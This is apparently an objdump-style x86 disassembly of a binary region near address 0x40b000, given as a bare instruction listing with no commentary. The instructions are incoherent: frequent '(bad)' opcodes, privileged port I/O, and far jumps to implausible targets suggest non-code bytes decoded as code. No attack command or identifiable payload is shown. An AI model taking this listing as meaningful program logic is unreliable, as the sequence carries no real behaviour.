  40afdc:	ins    DWORD PTR es:[edi],dx
  40afdd:	adc    DWORD PTR [esi+0x78],ebx
  40afe0:	mov    ebx,0xfb14e057
  40afe5:	in     al,dx
  40afe6:	icebp  
  40afe7:	or     edi,0x33e3aa9c
  40afed:	cli    
  40afee:	mov    edi,esi
  40aff0:	cmp    eax,0xfe1613b2
  40aff5:	nop
  40aff6:	add    eax,0x16866a9e
  40affb:	xchg   ebx,eax
  40affc:	outs   dx,BYTE PTR ds:[esi]
  40affd:	add    DWORD PTR [ebx-0x64],esp
  40b000:	mov    edi,0xf316eacc
  40b005:	push   ecx
  40b006:	(bad)  
  40b007:	adc    bh,BYTE PTR ds:0x3e9598c
  40b00d:	mov    ecx,0x99822df6
  40b012:	out    dx,eax
  40b013:	sub    eax,0xd8d61f0d
  40b018:	mov    edx,0xf37a0b82
  40b01d:	in     al,dx
  40b01e:	mov    al,0x2f
  40b020:	test   al,0x6d
  40b022:	popa   
  40b023:	pop    esp
  40b024:	scas   eax,DWORD PTR es:[edi]
  40b025:	or     ebp,ebx
  40b027:	cs ins BYTE PTR es:[edi],dx
  40b029:	in     eax,dx
  40b02a:	jge    0x40afb6
  40b02c:	bound  ecx,QWORD PTR [ebp-0x59ed5446]
  40b032:	sub    DWORD PTR [ebx+0x11],edx
  40b035:	aaa    
  40b036:	les    ecx,FWORD PTR [ecx]
  40b038:	not    DWORD PTR [edi-0x1]
  40b03b:	retf   
  40b03c:	fs data16 int 0xc4
  40b040:	in     al,0xe5
  40b042:	pop    ss
  40b043:	push   ebx
  40b044:	adc    BYTE PTR [edi+0x6e4cb1c6],ah
  40b04a:	xor    ah,BYTE PTR [ecx+ebx*2-0x49a4b982]
  40b051:	mul    eax
  40b053:	mov    ah,0x91
  40b055:	sbb    edi,esi
  40b057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b058:	push   edi
  40b059:	mov    DWORD PTR [esi-0x3ec9e423],ebp
  40b05f:	clc    
  40b060:	icebp  
  40b061:	aam    0x5b
  40b063:	mov    bl,0x28
  40b065:	push   ss
  40b066:	(bad)  
  40b067:	ins    BYTE PTR es:[edi],dx
  40b068:	sub    bh,ch
  40b06a:	pushf  
  40b06b:	(bad)  
  40b06c:	shl    DWORD PTR ds:0x999aa906,0x98
  40b073:	in     eax,0x10
  40b075:	in     eax,0x84
  40b077:	mov    bh,0xa9
  40b079:	ins    DWORD PTR es:[edi],dx
  40b07a:	push   ecx
  40b07b:	xor    BYTE PTR [ebx+esi*2+0x3f],bh
  40b07f:	lock inc edi
  40b081:	mov    bh,0x6e
  40b083:	push   ebx
  40b084:	outs   dx,DWORD PTR ds:[esi]
  40b085:	pop    ebx
  40b086:	ror    BYTE PTR [edi+0x5c093a12],0x13
  40b08d:	jge    0x40b10b
  40b08f:	std    
  40b090:	(bad)  
  40b091:	xchg   ebx,eax
  40b092:	inc    edi
  40b093:	out    0x13,al
  40b095:	push   edi
  40b096:	xchg   edx,eax
  40b097:	lods   eax,DWORD PTR ds:[esi]
  40b098:	repnz inc edx
  40b09a:	sbb    eax,0x82a109fb
  40b09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a0:	(bad)  
  40b0a1:	lods   eax,DWORD PTR ds:[esi]
  40b0a2:	push   eax
  40b0a3:	inc    edx
  40b0a4:	xor    BYTE PTR [ebx+0x6de896da],ah
  40b0aa:	jge    0x40b087
  40b0ac:	adc    cl,BYTE PTR [edx+0x44f9ab7e]
  40b0b2:	retf   
  40b0b3:	in     eax,dx
  40b0b4:	mov    al,ds:0x992d3ff3
  40b0b9:	mov    ecx,0xc420472c
  40b0be:	sbb    al,0xbd
  40b0c0:	clc    
  40b0c1:	pop    es
  40b0c2:	imul   eax,DWORD PTR [ecx+edx*1-0x21dd7d0d],0x61
  40b0ca:	and    al,0x2b
  40b0cc:	sbb    DWORD PTR [ebx-0x12],ebx
  40b0cf:	test   eax,0x4abf95b2
  40b0d4:	and    eax,0xdbb02907
  40b0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0da:	ja     0x40b0d3
  40b0dc:	or     DWORD PTR [ebp+0x17f5e212],ecx
  40b0e2:	jmp    0x9a6e:0xab32a1b7
  40b0e9:	outs   dx,DWORD PTR ds:[esi]
  40b0ea:	mov    edi,?
  40b0ec:	jb     0x40b11e
  40b0ee:	(bad)  
  40b0ef:	stos   DWORD PTR es:[edi],eax
  40b0f0:	xchg   edx,eax
  40b0f1:	jno    0x40b11a
  40b0f3:	shl    DWORD PTR [eax],cl
  40b0f5:	jns    0x40b149
  40b0f7:	sbb    al,0xa2
  40b0f9:	xchg   BYTE PTR [edi-0x5f26875c],ah
  40b0ff:	call   0x3415:0x7363a99e
  40b106:	xor    al,0xbd
  40b108:	popf   
  40b109:	cmp    BYTE PTR [ebx-0x1],bl
  40b10c:	mov    ds:0xd268cf28,eax
  40b111:	scas   al,BYTE PTR es:[edi]
  40b112:	jle    0x40b0d3
  40b114:	rcr    edi,0x7e
  40b117:	sar    BYTE PTR [edx+0x382e0e72],cl
  40b11d:	aas    
  40b11e:	sbb    BYTE PTR [esi+0x900a12d],bh
  40b124:	dec    ebp
  40b125:	test   DWORD PTR [edi+0x51b0f97c],esi
  40b12b:	in     eax,0xa3
  40b12d:	push   es
  40b12e:	xchg   edx,eax
  40b12f:	sub    eax,0xe11346d7
  40b134:	shl    DWORD PTR [edi-0x3c],1
  40b137:	push   ecx
  40b138:	mov    ebp,0x7f5d81a
  40b13d:	lods   al,BYTE PTR ds:[esi]
  40b13e:	xor    ch,BYTE PTR es:[ebp+0x432f302f]
  40b145:	jp     0x40b192
  40b147:	inc    esp
  40b148:	imul   ebp,DWORD PTR [edx-0x10],0xffffffc0
  40b14c:	add    eax,0xb8eef326
  40b151:	mov    al,0x68
  40b153:	repz mov edi,0xf6e7645f
  40b159:	add    cl,dh
  40b15b:	iret   
  40b15c:	daa    
  40b15d:	cwde   
  40b15e:	fidivr DWORD PTR [edi-0x7c0b8683]
  40b164:	sub    dh,BYTE PTR [eax+0x20b75f0]
  40b16a:	sub    DWORD PTR [ecx+0x26ba726a],ebp
  40b170:	xchg   esi,eax
  40b171:	ins    DWORD PTR es:[edi],dx
  40b172:	cld    
  40b173:	(bad)  
  40b174:	ret    
  40b175:	test   DWORD PTR [eax],esi
  40b177:	add    dh,bh
  40b179:	push   ss
  40b17a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b17b:	sbb    DWORD PTR [eax+0x36],esi
  40b17e:	pop    ebx
  40b17f:	push   ebp
  40b180:	(bad)  
  40b181:	not    eax
  40b183:	mov    esp,0xff1e1849
  40b188:	pop    ebx
  40b189:	xchg   ebx,eax
  40b18a:	mov    ebx,0x48ce9269
  40b18f:	out    dx,al
  40b190:	(bad)  
  40b191:	and    al,BYTE PTR [ebx+ebp*1]
  40b194:	out    0xf7,al
  40b196:	shl    DWORD PTR [eax],1
  40b198:	fsubr  DWORD PTR [eax+0x42]
  40b19b:	sbb    dh,dl
  40b19d:	inc    ebx
  40b19e:	xchg   ebx,eax
  40b19f:	sub    DWORD PTR [edx],eax
  40b1a1:	add    BYTE PTR [eax+0x60],dh
  40b1a4:	cdq    
  40b1a5:	dec    ebp
  40b1a6:	test   BYTE PTR [esi],dh
  40b1a8:	mov    DWORD PTR [esi-0x58cd5956],esp
  40b1ae:	xchg   ecx,eax
  40b1af:	stos   BYTE PTR es:[edi],al
  40b1b0:	imul   ebp,DWORD PTR [eax+ecx*2],0xffffffb1
  40b1b4:	pop    eax
  40b1b5:	and    al,0x8d
  40b1b7:	mov    cl,0xbc
  40b1b9:	or     edi,ecx
  40b1bb:	xchg   ebp,eax
  40b1bc:	mov    bl,0x34
  40b1be:	test   al,0x26
  40b1c0:	div    DWORD PTR [esi+0x4]
  40b1c3:	xor    ch,dh
  40b1c5:	das    
  40b1c6:	jecxz  0x40b1eb
  40b1c8:	push   cs
  40b1c9:	mov    DWORD PTR [ebx],ecx
  40b1cb:	or     ch,BYTE PTR [ebx-0x66]
  40b1ce:	shl    cl,1
  40b1d0:	add    eax,0x569fcd56
  40b1d5:	es out dx,al
  40b1d7:	add    edx,0x602a4c4a
  40b1dd:	mov    ah,0xf6
  40b1df:	out    0x5b,al
  40b1e1:	xchg   ebp,eax
  40b1e2:	mov    ch,0xe9
  40b1e4:	sbb    esi,DWORD PTR [edi+0x6dec92cf]
  40b1ea:	mov    ah,0x9
  40b1ec:	adc    ebx,eax
  40b1ee:	neg    ah
  40b1f0:	cwde   
  40b1f1:	loope  0x40b1d8
  40b1f3:	imul   DWORD PTR ds:0x903cf99a
  40b1f9:	jge    0x40b18a
  40b1fb:	je     0x40b1ae
  40b1fd:	adc    ebx,DWORD PTR [edi-0x5cb1fb93]
  40b203:	adc    bl,BYTE PTR [ecx+edx*1-0x12]
  40b207:	inc    edx
  40b208:	mov    ds:0xb5c544a7,eax
  40b20d:	xor    bl,BYTE PTR [ecx-0x76]
  40b210:	adc    DWORD PTR [ecx+0x597cf934],ecx
  40b216:	(bad)  
  40b217:	mov    ebp,0xe9290fda
  40b21c:	xor    BYTE PTR [edi+0x53],dh
  40b21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b220:	repz add eax,0xc0a9f3d8
  40b226:	pop    es
  40b227:	in     eax,dx
  40b228:	adc    DWORD PTR [eax-0x74c403f3],ecx
  40b22e:	inc    eax
  40b22f:	stos   DWORD PTR es:[edi],eax
  40b230:	inc    edx
  40b231:	mov    ch,0x56
  40b233:	mov    ebx,0xd4e9cd9f
  40b238:	mov    al,0x32
  40b23a:	rcl    BYTE PTR [ecx+0x28],1
  40b23d:	push   eax
  40b23e:	cmp    al,0x7f
  40b240:	aam    0x97
  40b242:	aas    
  40b243:	stc    
  40b244:	and    esi,DWORD PTR ds:0x6cdf14e2
  40b24a:	ins    BYTE PTR es:[edi],dx
  40b24b:	lock cmp DWORD PTR [esi-0x6c],eax
  40b24f:	adc    BYTE PTR [esi-0x5ec0ceae],ch
  40b255:	fisttp QWORD PTR [edx-0xa]
  40b258:	arpl   WORD PTR [edx-0x5],bp
  40b25b:	je     0x40b22b
  40b25d:	and    DWORD PTR [esi+0x31fee1ff],esi
  40b263:	pop    esi
  40b264:	xor    esi,DWORD PTR [esi-0x8c6027a]
  40b26a:	arpl   bp,bp
  40b26c:	mov    ebx,0x848887d5
  40b271:	nop
  40b272:	xchg   esi,eax
  40b273:	and    bh,BYTE PTR [ebx-0x2b]
  40b276:	rcl    DWORD PTR [ebx],1
  40b278:	fadd   DWORD PTR es:[ebx-0x7dcab695]
  40b27f:	fnsave [ebx+0x32]
  40b282:	and    ebx,0x88a351aa
  40b288:	lods   eax,DWORD PTR ds:[esi]
  40b289:	and    al,BYTE PTR [esi]
  40b28b:	div    DWORD PTR [edi+0x45]
  40b28e:	aad    0x2f
  40b290:	jb     0x40b270
  40b292:	addr16 sub edx,edx
  40b295:	call   0xfbe4ac8a
  40b29a:	push   cs
  40b29b:	mov    cl,0xa
  40b29d:	into   
  40b29e:	call   0x9995:0x859f6582
  40b2a5:	pop    esp
  40b2a6:	cmp    esi,DWORD PTR [edi]
  40b2a8:	pop    edx
  40b2a9:	mov    esp,0x5cfbb16e
  40b2ae:	dec    edx
  40b2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2b0:	add    eax,0xeffd53df
  40b2b5:	call   0x97bf:0x7a4a2329
  40b2bc:	cmp    DWORD PTR [ebp+0xeb971a3],0x6e
  40b2c3:	std    
  40b2c4:	add    esi,DWORD PTR [edx-0x7e5675c3]
  40b2ca:	jns    0x40b322
  40b2cc:	dec    ecx
  40b2cd:	stos   BYTE PTR es:[edi],al
  40b2ce:	add    al,0x66
  40b2d0:	data16 adc BYTE PTR [ecx],dl
  40b2d3:	retf   
  40b2d4:	cwde   
  40b2d5:	cmp    dh,al
  40b2d7:	lahf   
  40b2d8:	jmp    0x4b76:0xeefa7500
  40b2df:	dec    ecx
  40b2e0:	xchg   esp,eax
  40b2e1:	xchg   BYTE PTR [ebx+0x54],dh
  40b2e4:	cmp    al,0x76
  40b2e6:	pushf  
  40b2e7:	push   esi
  40b2e8:	sbb    al,BYTE PTR [esi+0x7921f62d]
  40b2ee:	shl    esi,0x8f
  40b2f1:	mov    ebx,0x9e82f68d
  40b2f6:	(bad)  
  40b2f7:	push   esi
  40b2f8:	stos   DWORD PTR es:[edi],eax
  40b2f9:	stc    
  40b2fa:	add    dh,bl
  40b2fc:	fist   WORD PTR [ecx]
  40b2fe:	xchg   ecx,ebx
  40b300:	(bad)  
  40b301:	pop    ecx
  40b302:	pop    ds
  40b303:	ins    DWORD PTR es:[edi],dx
  40b304:	call   0x3f2273cc
  40b309:	xor    esi,DWORD PTR [esi+ebp*4-0x2cbce53d]
  40b310:	add    cl,ah
  40b312:	mov    bh,0xed
  40b314:	pop    edx
  40b315:	sub    al,0xac
  40b317:	les    esp,FWORD PTR [ecx]
  40b319:	pop    ss
  40b31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b31b:	sbb    eax,0xf6a797a7
  40b320:	into   
  40b321:	icebp  
  40b322:	xor    BYTE PTR [ebx],bh
  40b324:	lahf   
  40b325:	pop    ds
  40b326:	sar    BYTE PTR [edx+0x192845a8],cl
  40b32c:	inc    esp
  40b32d:	sbb    bl,BYTE PTR [edx-0x78]
  40b330:	mov    ebx,0xcf8c1b06
  40b335:	gs stc 
  40b337:	mov    ebx,0xe6d3a171
  40b33c:	mov    eax,0xba783f1d
  40b341:	sbb    eax,0x6d75a4b5
  40b346:	jg     0x40b35a
  40b348:	call   0x2b55af49
  40b34d:	clc    
  40b34e:	inc    esp
  40b34f:	cmp    DWORD PTR [ebx+0x44],0x54
  40b353:	lods   eax,DWORD PTR ds:[esi]
  40b354:	jns    0x40b36e
  40b356:	ins    BYTE PTR es:[edi],dx
  40b357:	push   0x7e
  40b359:	inc    ebp
  40b35a:	lahf   
  40b35b:	mov    edx,0x9cea6f64
  40b360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b361:	iret   
  40b362:	xcrypt-cbc (bad)
  40b363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b364:	xlat   BYTE PTR ds:[ebx]
  40b365:	scas   eax,DWORD PTR es:[edi]
  40b366:	dec    esi
  40b367:	hlt    
  40b368:	and    ecx,DWORD PTR [edi*1-0x3faf8cd7]
  40b36f:	push   ecx
  40b370:	leave  
  40b371:	or     BYTE PTR [esi+0x19],dl
  40b374:	bound  esp,QWORD PTR [edx+0x3c]
  40b377:	xor    BYTE PTR [ecx+0x7d],cl
  40b37a:	sub    BYTE PTR [ebx+0x3989ea1d],ch
  40b380:	push   esi
  40b381:	push   esp
  40b382:	dec    eax
  40b383:	push   0x2
  40b385:	mov    esp,0xc933b5a8
  40b38a:	sbb    DWORD PTR [esi+0x7d7e9a01],ecx
  40b390:	jbe    0x40b385
  40b392:	add    DWORD PTR [ebp+0x26aa0f2f],ebx
  40b398:	jmp    0xb6431b3d
  40b39d:	or     eax,0xec8fa256
  40b3a2:	enter  0x3df7,0x83
  40b3a6:	dec    eax
  40b3a7:	ins    DWORD PTR es:[edi],dx
  40b3a8:	int3   
  40b3a9:	mov    ch,0x4d
  40b3ab:	aam    0x6
  40b3ad:	xchg   ebx,eax
  40b3ae:	mov    ebx,0xd8cdb6ab
  40b3b3:	loop   0x40b392
  40b3b5:	push   ebx
  40b3b6:	jb     0x40b424
  40b3b8:	jno    0x40b353
  40b3ba:	lea    esp,cs:[eax+0x7e]
  40b3be:	sub    BYTE PTR [ebx],bh
  40b3c0:	mov    cs,WORD PTR [esi+0x6d]
  40b3c3:	cmp    bh,BYTE PTR [edx+eiz*2+0x7ac9a971]
  40b3ca:	sbb    BYTE PTR [edx],al
  40b3cc:	push   edi
  40b3cd:	xor    eax,0xfc6bc299
  40b3d2:	ss mov dh,0x64
  40b3d5:	mov    dl,0xb7
  40b3d7:	stc    
  40b3d8:	pop    edx
  40b3d9:	bswap  ebx
  40b3db:	adc    esp,DWORD PTR [edx-0x77]
  40b3de:	stc    
  40b3df:	arpl   sp,bx
  40b3e1:	xchg   DWORD PTR [ebx-0x74],edi
  40b3e4:	push   0x6f
  40b3e6:	push   eax
  40b3e7:	fcom   DWORD PTR [ebp-0x7a1581a8]
  40b3ed:	adc    al,0x3d
  40b3ef:	stos   DWORD PTR es:[edi],eax
  40b3f0:	cmc    
  40b3f1:	pop    es
  40b3f2:	dec    esi
  40b3f3:	jl     0x40b415
  40b3f5:	stos   DWORD PTR es:[edi],eax
  40b3f6:	cli    
  40b3f7:	cmp    BYTE PTR [edx+edx*2+0x66014d6],cl
  40b3fe:	lods   al,BYTE PTR ds:[esi]
  40b3ff:	int3   
  40b400:	jmp    0x40b3f4
  40b402:	jl     0x40b47c
  40b404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b405:	fimul  WORD PTR [eax-0xe]
  40b408:	outs   dx,DWORD PTR ds:[esi]
  40b409:	xchg   ebx,eax
  40b40a:	push   ecx
  40b40b:	test   BYTE PTR [edx+0x2f0d8659],ah
  40b411:	(bad)  
  40b412:	shl    DWORD PTR [edx-0x452af4c4],1
  40b418:	fiadd  DWORD PTR [esi+0x5faad1a6]
  40b41e:	shl    DWORD PTR [ecx],0x79
  40b421:	and    edx,DWORD PTR [esi]
  40b423:	aam    0x49
  40b425:	or     eax,0x708c3f5a
  40b42a:	xchg   edx,eax
  40b42b:	ror    BYTE PTR [ecx+edx*2],1
  40b42e:	or     dl,cl
  40b430:	adc    BYTE PTR [eax-0x1865069a],ah
  40b436:	loopne 0x40b3ef
  40b438:	leave  
  40b439:	stos   DWORD PTR es:[edi],eax
  40b43a:	xor    esp,ecx
  40b43c:	outs   dx,BYTE PTR ds:[esi]
  40b43d:	jno    0x40b414
  40b43f:	jge    0x40b418
  40b441:	arpl   WORD PTR [ebx+0x29],ax
  40b444:	jle    0x40b4bd
  40b446:	(bad)  
  40b448:	(bad)  
  40b44a:	sub    DWORD PTR ds:[ebp-0x277f8baa],0x35
  40b452:	cmp    DWORD PTR [ecx+0xad57ba6],edi
  40b458:	in     eax,0x4f
  40b45a:	loop   0x40b4b8
  40b45c:	add    esi,DWORD PTR [edi+0x54]
  40b45f:	pushf  
  40b460:	jmp    0xdafc:0x29e23581
  40b467:	mov    ss,WORD PTR [edx*2-0x26a67a1a]
  40b46e:	xchg   esp,eax
  40b46f:	mov    edi,0x2935a507
  40b474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b475:	or     al,0x9d
  40b477:	pop    esp
  40b478:	mov    ebx,0xb7ce27b5
  40b47d:	pop    ecx
  40b47e:	inc    edi
  40b47f:	aad    0x42
  40b481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b482:	xor    al,0x7d
  40b484:	rol    BYTE PTR [ebx+ebp*1-0x43],1
  40b488:	ss dec eax
  40b48a:	pop    eax
  40b48b:	xchg   ebx,eax
  40b48c:	hlt    
  40b48d:	aas    
  40b48e:	dec    edi
  40b48f:	into   
  40b490:	push   0xa712b6c4
  40b495:	inc    ecx
  40b496:	jno    0x40b469
  40b498:	fild   QWORD PTR [edx+0x1b9fa124]
  40b49e:	ja     0x40b4d4
  40b4a0:	sbb    BYTE PTR [edx+ebp*1+0x19],dh
  40b4a4:	(bad)  
  40b4a5:	pop    esp
  40b4a6:	sahf   
  40b4a7:	add    al,0xbd
  40b4a9:	mov    ecx,DWORD PTR [eax-0x1ee45078]
  40b4af:	clc    
  40b4b0:	call   0xaf341dc2
  40b4b5:	push   ds
  40b4b6:	retf   0xaf56
  40b4b9:	mov    ds:0x302afaca,eax
  40b4be:	fist   DWORD PTR [esi+ebp*8+0x79]
  40b4c2:	add    al,0x27
  40b4c4:	mov    ds:0xe2976799,al
  40b4c9:	jae    0x40b4ac
  40b4cb:	in     eax,0xb4
  40b4cd:	add    DWORD PTR [eax+eiz*1+0x60],0x74a27707
  40b4d5:	outs   dx,DWORD PTR ds:[esi]
  40b4d6:	es daa 
  40b4d8:	push   esi
  40b4d9:	aam    0x55
  40b4db:	xor    esp,DWORD PTR [esi]
  40b4dd:	in     al,dx
  40b4de:	xchg   edx,eax
  40b4df:	sahf   
  40b4e0:	push   0x4db165c3
  40b4e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e6:	(bad)  
  40b4e7:	aas    
  40b4e8:	stos   BYTE PTR es:[edi],al
  40b4e9:	test   BYTE PTR [eax-0x33],dl
  40b4ec:	sbb    cl,BYTE PTR [esi+0x7a]
  40b4ef:	push   ebx
  40b4f0:	int    0xb7
  40b4f2:	sbb    ah,dh
  40b4f4:	call   0x4b56:0xd3fe1ac6
  40b4fb:	aad    0x26
  40b4fd:	mov    edi,0x1436ffe5
  40b502:	jge    0x40b501
  40b504:	or     eax,DWORD PTR [edx]
  40b506:	into   
  40b507:	cmp    al,0x77
  40b509:	iret   
  40b50a:	jo     0x40b57f
  40b50c:	cmp    DWORD PTR [ecx-0x78],esi
  40b50f:	je     0x40b4aa
  40b511:	cmp    eax,0x4c9977d4
  40b516:	mov    ebx,0xd146b0f1
  40b51b:	fidivr WORD PTR [edi+0x86b1bd]
  40b521:	adc    eax,0xc3044906
  40b526:	or     BYTE PTR [edx],bl
  40b528:	frstor [ecx+0x67]
  40b52b:	jo     0x40b5a8
  40b52d:	or     cl,BYTE PTR [edx+0x19d6d237]
  40b533:	mov    ds:0x89885946,al
  40b538:	sar    DWORD PTR [esi],0x96
  40b53b:	inc    edi
  40b53c:	sbb    al,dh
  40b53e:	xor    BYTE PTR [edi],0x8e
  40b541:	xchg   ebp,eax
  40b542:	or     eax,0x7851887c
  40b547:	mov    dh,0x33
  40b549:	cld    
  40b54a:	aaa    
  40b54b:	(bad)  
  40b54d:	mov    esi,fs
  40b54f:	jl     0x40b504
  40b551:	pop    ss
  40b552:	and    ecx,ecx
  40b554:	fisttp DWORD PTR [esp+esi*2+0x211618c]
  40b55b:	xchg   edi,eax
  40b55c:	mov    eax,0x645f806e
  40b561:	aam    0x8c
  40b563:	mov    ebx,0x3a436fbd
  40b568:	jmp    0x9b21:0xde3be7d8
  40b56f:	xchg   DWORD PTR [esi+0x64cb4a4c],esp
  40b575:	push   edx
  40b576:	xchg   BYTE PTR [edx+0x7ca2a5c0],dh
  40b57c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b57d:	test   DWORD PTR [eax],0x47edaaeb
  40b583:	sub    DWORD PTR [ebx+ebx*4+0x60],ebx
  40b587:	int3   
  40b588:	mov    edi,0x52d821c7
  40b58d:	add    al,0x48
  40b58f:	inc    esi
  40b590:	retf   
  40b591:	xchg   ebp,eax
  40b592:	gs nop
  40b594:	mov    esi,0x12d195
  40b599:	pslld  mm3,mm0
  40b59c:	xor    eax,0x29bd8987
  40b5a1:	inc    ecx
  40b5a2:	xor    al,dl
  40b5a4:	scas   al,BYTE PTR es:[edi]
  40b5a5:	ins    DWORD PTR es:[edi],dx
  40b5a6:	cmp    esp,0x7611acec
  40b5ac:	bound  ebx,QWORD PTR [ebx]
  40b5ae:	je     0x40b55d
  40b5b0:	mov    eax,ds:0xb2c2ca0f
  40b5b5:	pop    es
  40b5b6:	lea    eax,[esi-0x3a]
  40b5b9:	or     esi,ecx
  40b5bb:	add    BYTE PTR [ecx-0x6],cl
  40b5be:	cmp    ecx,DWORD PTR ds:0x3d2be0a1
  40b5c4:	xor    BYTE PTR [bx+si],bh
  40b5c7:	mov    ebp,0xefe057f6
  40b5cc:	jecxz  0x40b60f
  40b5ce:	and    dl,BYTE PTR [edx+0x13114678]
  40b5d4:	jmp    0x3a59:0xefa240e5
  40b5db:	enter  0x2159,0xc7
  40b5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5e0:	mov    edx,0x9fc9e106
  40b5e5:	(bad)  
  40b5e6:	nop
  40b5e7:	in     eax,0xd3
  40b5e9:	inc    esi
  40b5ea:	add    ebp,edx
  40b5ec:	aad    0xb3
  40b5ee:	jno    0x40b640
  40b5f0:	xor    eax,0x18a5a37a
  40b5f5:	fdiv   DWORD PTR [edi+ecx*4+0x1da7b071]
  40b5fc:	cmc    
  40b5fd:	sbb    ebx,edi
  40b5ff:	mov    ah,0x8e
  40b601:	(bad)  
  40b602:	sysenter 
  40b604:	enter  0xf5d3,0x7e
  40b608:	xchg   ecx,eax
  40b609:	push   edi
  40b60a:	aad    0xf2
  40b60c:	imul   eax,ebp,0x0
  40b60f:	lods   eax,DWORD PTR ds:[esi]
  40b610:	(bad)
  40b614:	and    dh,al
  40b616:	add    cl,BYTE PTR [esp+eax*2+0x4]
  40b61a:	add    eax,0xe1c0ad19
  40b61f:	and    al,0xf0
  40b621:	int3   
  40b622:	test   al,0xcc
  40b624:	push   0x35
  40b626:	mov    edi,0xf47dfc8e
  40b62b:	push   ebx
  40b62c:	or     BYTE PTR [ecx],dh
  40b62e:	mov    dl,0xda
  40b630:	retf   0x4157
  40b633:	or     DWORD PTR [ecx+0x17],0x4b
  40b637:	lods   al,BYTE PTR ds:[esi]
  40b638:	test   eax,0x4e366108
  40b63d:	pusha  
  40b63e:	cwde   
  40b63f:	stos   BYTE PTR es:[edi],al
  40b640:	fiadd  DWORD PTR [ebx+0x32fb12b]
  40b646:	inc    ebx
  40b647:	mov    edx,0x744704fe
  40b64c:	mul    DWORD PTR [esi]
  40b64e:	jle    0x40b638
  40b650:	es push ebp
  40b652:	or     eax,0xf2a071dd
  40b657:	mov    bh,0x71
  40b659:	inc    edx
  40b65a:	jl     0x40b6c0
  40b65c:	mov    cl,0xbd
  40b65e:	add    dl,dl
  40b660:	or     ch,dh
  40b662:	dec    ebx
  40b663:	pop    es
  40b664:	scas   eax,DWORD PTR es:[edi]
  40b665:	lahf   
  40b666:	stos   DWORD PTR es:[edi],eax
  40b667:	jbe    0x40b64b
  40b669:	fisub  WORD PTR [edi]
  40b66b:	neg    DWORD PTR [edx+0x2c7564fb]
  40b671:	xchg   ebx,eax
  40b672:	and    al,0x4e
  40b674:	add    esi,DWORD PTR gs:[ebp-0x20]
  40b678:	mov    ds:0x9cd38fc,eax
  40b67d:	adc    cl,0xd6
  40b680:	out    0x7a,al
  40b682:	ja     0x40b67d
  40b684:	mov    al,ds:0xeb8741f5
  40b689:	and    al,0xa6
  40b68b:	(bad)  
  40b68c:	fistp  DWORD PTR [ecx+0x17]
  40b68f:	jmp    0x40b69d
  40b691:	dec    edx
  40b692:	mov    ds:0xfada4839,eax
  40b697:	and    eax,ecx
  40b699:	leave  
  40b69a:	xor    ah,BYTE PTR [esi-0x60]
  40b69d:	sub    dl,al
  40b69f:	sub    eax,0x7fca34f5
  40b6a4:	ins    BYTE PTR es:[edi],dx
  40b6a5:	shl    DWORD PTR [edi],cl
  40b6a7:	xchg   ebp,eax
  40b6a8:	add    dh,cl
  40b6aa:	add    al,0xb9
  40b6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6ad:	pop    ebp
  40b6ae:	icebp  
  40b6af:	mov    al,ds:0x9637d516
  40b6b4:	add    ch,BYTE PTR [esi]
  40b6b6:	jmp    0xf9e7:0xdf8a11b4
  40b6bd:	xor    esi,DWORD PTR [esi+0x7c]
  40b6c0:	test   eax,0x16bef50c
  40b6c5:	push   0xffffffca
  40b6c7:	inc    edi
  40b6c8:	repnz or esi,DWORD PTR [edx+0x7c]
  40b6cc:	or     ch,bl
  40b6ce:	mov    dh,0xa5
  40b6d0:	jne    0x40b699
  40b6d2:	btr    ebx,ecx
  40b6d5:	retf   0xe88a
  40b6d8:	push   edx
  40b6d9:	lds    ebp,FWORD PTR [edi]
  40b6db:	or     DWORD PTR [edx-0x461cb509],esi
  40b6e1:	mov    WORD PTR [ebx-0x450caa10],ss
  40b6e7:	mov    dl,0xf8
  40b6e9:	or     DWORD PTR [ebx-0x38],edi
  40b6ec:	ins    BYTE PTR es:[edi],dx
  40b6ed:	xchg   edx,eax
  40b6ee:	call   0x3e6e:0x4765d346
  40b6f5:	dec    ebp
  40b6f6:	retf   0x21b3
  40b6f9:	adc    ah,ch
  40b6fb:	imul   edi,DWORD PTR [ecx+0x33],0x73c9fecc
  40b702:	jne    0x40b6d8
  40b704:	dec    ecx
  40b705:	or     DWORD PTR [edx-0x5c],eax
  40b708:	sub    DWORD PTR [edx],edi
  40b70a:	jbe    0x40b6cb
  40b70c:	sahf   
  40b70d:	fwait
  40b70e:	mov    ebx,0x299b33b2
  40b713:	aaa    
  40b714:	adc    cl,BYTE PTR [edi+ecx*2]
  40b717:	cli    
  40b718:	fdivrp st(7),st
  40b71a:	pop    esi
  40b71b:	hlt    
  40b71c:	jmp    0x2e9f:0x52968e4d
  40b723:	mov    dh,0xbd
  40b725:	aas    
  40b726:	icebp  
  40b727:	int    0xe6
  40b729:	unpcklps xmm3,xmm5
  40b72c:	sub    esi,edx
  40b72e:	test   BYTE PTR [esi-0x750dd8be],cl
  40b734:	aam    0x32
  40b736:	add    bh,BYTE PTR [esi+edx*2]
  40b739:	jge    0x40b788
  40b73b:	jno    0x40b786
  40b73d:	sub    DWORD PTR [edi+0x1b],ecx
  40b740:	mov    ss,WORD PTR [eax]
  40b742:	out    0x80,eax
  40b744:	add    ecx,DWORD PTR [ecx-0x3e01ece3]
  40b74a:	fsub   DWORD PTR [edx-0x2c0de33e]
  40b750:	loopne 0x40b76d
  40b752:	mov    edx,0xac002bf9
  40b757:	retf   0x84b6
  40b75a:	xor    ebp,ebp
  40b75c:	push   DWORD PTR [eax+eax*8-0x2f]
  40b760:	adc    al,0xc2
  40b762:	iret   
  40b763:	push   ebx
